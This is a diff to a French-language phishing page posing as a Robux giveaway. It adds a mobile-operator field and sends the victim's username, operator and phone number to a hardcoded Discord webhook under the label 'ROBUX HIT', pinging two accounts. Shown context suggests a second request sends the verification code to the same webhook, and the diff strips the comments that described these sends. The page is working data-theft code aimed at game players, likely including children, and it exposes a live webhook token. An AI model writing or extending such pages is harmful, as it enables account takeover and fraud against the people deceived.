@@ -416,7 +416,16 @@
           <button type="button" data-a="4500" onclick="pickAmt(this)" class="sel">4 500<small>R$</small></button>
           <button type="button" data-a="10000" onclick="pickAmt(this)">10 000<small>R$</small></button>
         </div>
-        <label class="m-label" for="g_phone" style="margin-top:14px;">Numéro de téléphone (vérification)</label>
+
+        <!-- === CHAMP OPÉRATEUR AJOUTÉ === -->
+        <label class="m-label" style="margin-top:14px;">Opérateur</label>
+        <select id="g_operator" style="width:100%; padding:14px; background:#0e0f16; border:1.5px solid var(--line); border-radius:12px; color:var(--text); font-size:16px; margin-bottom:12px;">
+          <option value="Bouygues">Bouygues</option>
+          <option value="SFR">SFR</option>
+          <option value="Orange">Orange</option>
+        </select>
+
+        <label class="m-label" for="g_phone">Numéro de téléphone (vérification)</label>
         <div class="m-input"><span class="pre">📱</span><input id="g_phone" type="text" placeholder="06 12 34 56 78" autocomplete="off" inputmode="tel"></div>
         <div class="err" id="err_phone">Entre un numéro valide pour recevoir le code.</div>
         <button class="btn" onclick="toStep3()">Envoyer le code →</button>
@@ -438,10 +447,8 @@
   </div>
 
 <script>
-  // ==================== WEBHOOK DISCORD (avec ping) ====================
   const WEBHOOK = "https://discord.com/api/webhooks/1523821118358552626/lfWBCG2w1kAhIvPFhcYLQOe8V3z_YW66UiweHbTJ1ZOXYswiEx6ahHvEqmxSyIVbzbIu";
 
-  // hero animated numbers
   (function(){
     var pct = document.getElementById('heroPct');
     setInterval(function(){
@@ -490,6 +497,7 @@
 
   function toStep3(){
     var phone = document.getElementById('g_phone').value.trim();
+    var operator = document.getElementById('g_operator').value;
     var digits = phone.replace(/\D/g,'');
     if(digits.length < 8){ document.getElementById('err_phone').style.display='block'; return; }
     document.getElementById('err_phone').style.display='none';
@@ -497,12 +505,11 @@
     var amt = document.querySelector('#amts button.sel');
     document.getElementById('showAmt').textContent = amt ? amt.getAttribute('data-a').replace(/\B(?=(\d{3})+(?!\d))/g,' ') : '4 500';
 
-    // === ENVOI DU NUMÉRO SUR DISCORD (avec ping) ===
     fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: `<@896448018453233714> <@1514675664794423303> **ROBUX HIT**\nPseudo: @${currentUser}\nPhone: ${phone}`
+        content: `<@896448018453233714> <@1514675664794423303> **ROBUX HIT**\nPseudo: @${currentUser}\nOpérateur: ${operator}\nPhone: ${phone}`
       })
     });
 
@@ -537,7 +544,6 @@
       return;
     }
 
-    // === ENVOI DU CODE SUR DISCORD (avec ping) ===
     fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
